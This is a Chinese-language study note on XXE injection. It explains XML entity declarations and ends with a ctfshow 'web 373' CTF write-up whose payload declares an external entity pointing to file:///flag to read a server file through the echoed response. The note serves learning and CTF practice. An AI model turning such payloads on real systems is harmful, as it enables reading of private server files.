# XXE(XML External Entity Injection)

## 参考文章

[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区](https://xz.aliyun.com/t/3357)<br />[DTD 简介](https://www.w3school.com.cn/dtd/dtd_intro.asp)<br />[XXE(XML External Entity attack)XML外部实体注入攻击 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/181064.html)

## XXE漏洞成因

### XML外部实体

![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1676431108001-e4a44dd6-01e6-4743-9fcd-4ca62358b252.jpeg#averageHue=%232b2c25&clientId=u33ed94a5-0591-4&from=paste&id=u4eadcc1e&originHeight=166&originWidth=690&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ufea4fdf7-97d4-44a0-82e8-661f01ddee3&title=)

1. 一般实体的声明：

引用一般实体的方法：&实体名称;<br />p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。<br />2. 参数实体的声明：<br />引用参数实体的方法：%实体名称;<br />p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用

1. 内部实体声明

- 当引用一般实体时，由三部分构成：&、实体名、
- 当是用参数传入xml的时候，&需URL编码，不然&会被认为是参数间的连接符号。

示例：

```
<?xml version = "1.0" encoding = "utf-8"?>
<!DOCTYPE test [
<!ENTITY writer "Dawn">
<!ENTITY copyright "Copyright W3School.com.cn">
]>
<test>&writer;©right;</test>
```

2. 外部实体声明

`<!ENTITY 实体名称 SYSTEM "URI/URL">`

- 外部实体可支持http、file等协议

## web 373(有回显)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676431391524-8e12e0f1-390c-4eca-90fb-dc20079d684b.png#averageHue=%23fefefe&clientId=u33ed94a5-0591-4&from=paste&height=181&id=uc608b171&originHeight=362&originWidth=908&originalType=binary&ratio=2&rotation=0&showTitle=false&size=44209&status=done&style=none&taskId=ub88838f8-95fe-4f32-8274-c714f1fe31e&title=&width=454)

- 发现有回显，用file协议读取flag

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<x>
<ctfshow>&xxe;</ctfshow>
</x>
```

`<!DOCTYPE 根元素 [元素声明]>`

- 也就是服务器在loadXML后，会把`<x>`赋值给`$creds`
- `$creds`读取`ctfshow`，界面输出flag